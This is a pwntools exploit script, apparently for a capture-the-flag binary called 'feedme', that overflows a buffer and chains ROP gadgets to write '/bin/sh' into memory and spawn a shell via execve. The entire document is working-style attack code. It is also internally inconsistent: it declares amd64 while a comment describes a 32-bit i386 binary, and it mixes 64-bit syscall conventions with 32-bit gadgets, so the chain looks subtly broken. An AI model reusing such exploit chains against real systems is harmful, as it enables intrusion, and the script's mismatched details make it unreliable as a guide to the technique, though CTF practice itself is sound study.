from pwn import *

context.arch = "amd64"
context.binary = "./feedme"
elf = ELF("./feedme")
target = process("./feedme")
bss_addr = elf.bss()

# feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped

rop = ROP(elf)
pop_edi = rop.find_gadget(['pop edi', 'ret'])[0]
pop_esi = rop.find_gadget(['pop esi', 'ret'])[0]
pop_edx = rop.find_gadget(['pop edx', 'ret'])[0]
pop_eax = rop.find_gadget(['pop eax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
write_gadget = 0x0809a7ed

target_addr = elf.bss() + 0*100

padding = b"A" * (72 + 8)
payload = flat(
    padding,
    pop_edx,
    target_addr,
    pop_eax,
    b"/bin/sh\x00",
    write_gadget,
    
    pop_edi,
    target_addr,
    pop_esi,
    0,
    pop_edx,
    0,
    pop_eax,
    0x3b,
    syscall
)

target.sendlineafter(b"FEED ME!\n", payload)
target.interactive()
